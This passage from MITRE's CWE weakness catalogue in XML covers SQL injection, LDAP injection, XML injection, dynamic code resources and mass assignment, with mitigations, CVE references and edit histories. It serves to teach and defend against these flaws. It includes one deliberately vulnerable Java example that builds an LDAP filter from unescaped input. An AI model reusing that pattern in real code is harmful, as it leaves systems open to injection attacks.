					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">SQL Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2008-09-09">Failure to Sanitize Data into SQL Queries (aka 'SQL Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Failure to Sanitize Data within SQL Queries (aka 'SQL Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Preserve SQL Query Structure (aka 'SQL Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-07-27">Failure to Preserve SQL Query Structure ('SQL Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Improper Sanitization of Special Elements used in an SQL Command ('SQL Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="90" Name="Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product constructs all or part of an LDAP query using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when it is sent to a downstream component.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Database Server" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Note>An attacker could include input that changes the LDAP query which allows unintended commands or code to be executed, allows sensitive data to be read or modified or causes other unintended behavior.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The code below constructs an LDAP query using user input address data:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>context = new InitialDirContext(env);<xhtml:br/>String searchFilter = "StreetAddress=" + address;<xhtml:br/>NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);</xhtml:div>
               </Example_Code>
               <Body_Text>Because the code fails to neutralize the address string used to construct the query, an attacker can supply an address that includes additional LDAP queries.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-41232</Reference>
               <Description>Chain: authentication routine in Go-based agile development product does not escape user name (CWE-116), allowing LDAP injection (CWE-90)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-41232</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2301</Reference>
               <Description>Server does not properly escape LDAP queries, which allows remote attackers to cause a DoS and possibly conduct an LDAP injection attack.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2301</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>LDAP injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>29</Entry_ID>
               <Entry_Name>LDAP Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="136"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-879"/>
         </References>
         <Notes>
            <Note Type="Relationship">Factors: resultant to special character mismanagement, MAID, or denylist/allowlist problems. Can be primary to authentication and verification errors.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Name, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">LDAP Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Sanitize Data into LDAP Queries (aka 'LDAP Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Failure to Sanitize Data into LDAP Queries ('LDAP Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="91" Name="XML Injection (aka Blind XPath Injection)" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not properly neutralize special elements that are used in XML, allowing attackers to modify the syntax, content, or commands of the XML before it is processed by an end system.</Description>
         <Extended_Description>Within XML, special elements could include reserved words or characters such as "&lt;", "&gt;", """, and "&amp;", which could then be used to add new data or modify XML syntax.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>XML injection (aka Blind Xpath injection)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>23</Entry_ID>
               <Entry_Name>XML Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="250"/>
            <Related_Attack_Pattern CAPEC_ID="83"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-882"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;XML Injection&#34;, Page 1069"/>
         </References>
         <Notes>
            <Note Type="Maintenance">The description for this entry is generally applicable to XML, but the name includes "blind XPath injection" which is more closely associated with CWE-643. Therefore this entry might need to be deprecated or converted to a general category - although injection into raw XML is not covered by CWE-643 or CWE-652.</Note>
            <Note Type="Theoretical">In vulnerability theory terms, this is a representation-specific case of a Data/Directive Boundary Error.</Note>
            <Note Type="Research Gap">Under-reported. This is likely found regularly by third party code auditors, but there are very few publicly reported examples.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Other_Notes, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="913" Name="Improper Control of Dynamically-Managed Code Resources" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product does not properly restrict reading from or writing to dynamically-managed code resources such as variables, objects, classes, attributes, functions, or executable instructions or statements.</Description>
         <Extended_Description>Many languages offer powerful features that allow the programmer to dynamically create or modify existing code, or resources used by code such as variables and objects. While these features can offer significant flexibility and reduce development time, they can be extremely dangerous if attackers can directly influence these code resources in unexpected ways.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
            <Consequence>
               <Scope>Other</Scope>
               <Scope>Integrity</Scope>
               <Impact>Varies by Context</Impact>
               <Impact>Alter Execution Logic</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>For any externally-influenced input, check the input against an allowlist of acceptable values.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Strategy>Refactoring</Strategy>
               <Description>Refactor the code so that it does not need to be dynamically managed.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-01-26</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="915" Name="Improperly Controlled Modification of Dynamically-Determined Object Attributes" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product receives input from an upstream component that specifies multiple attributes, properties, or fields that are to be initialized or updated in an object, but it does not properly control which attributes can be modified.</Description>
         <Extended_Description>
            <xhtml:p>If the object contains attributes that were only intended for internal use, then their unexpected modification could lead to a vulnerability.</xhtml:p>
            <xhtml:p>This weakness is sometimes known by the language-specific mechanisms that make it possible, such as mass assignment, autobinding, or object injection.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="502" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="Ruby" Prevalence="Undetermined"/>
            <Language Name="ASP.NET" Prevalence="Undetermined"/>
            <Language Name="PHP" Prevalence="Undetermined"/>
            <Language Name="Python" Prevalence="Undetermined"/>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Mass Assignment</Term>
               <Description>"Mass assignment" is the name of a feature in Ruby on Rails that allows simultaneous modification of multiple object attributes.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>AutoBinding</Term>
               <Description>The "Autobinding" term is used in frameworks such as Spring MVC and ASP.NET MVC.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>PHP Object Injection</Term>
               <Description>Some PHP application researchers use this term for attacking unsafe use of the unserialize() function, but it is also used for CWE-502.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>An attacker could modify sensitive data or program variables.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
            <Consequence>
               <Scope>Other</Scope>
               <Scope>Integrity</Scope>
               <Impact>Varies by Context</Impact>
               <Impact>Alter Execution Logic</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>If available, use features of the language or framework that allow specification of allowlists of attributes or fields that are allowed to be modified. If possible, prefer allowlists over denylists.</xhtml:p>
                  <xhtml:p>For applications written with Ruby on Rails, use the attr_accessible (allowlist) or attr_protected (denylist) macros in each class that may be used in mass assignment.</xhtml:p>
               </Description>
            </Mitigation>
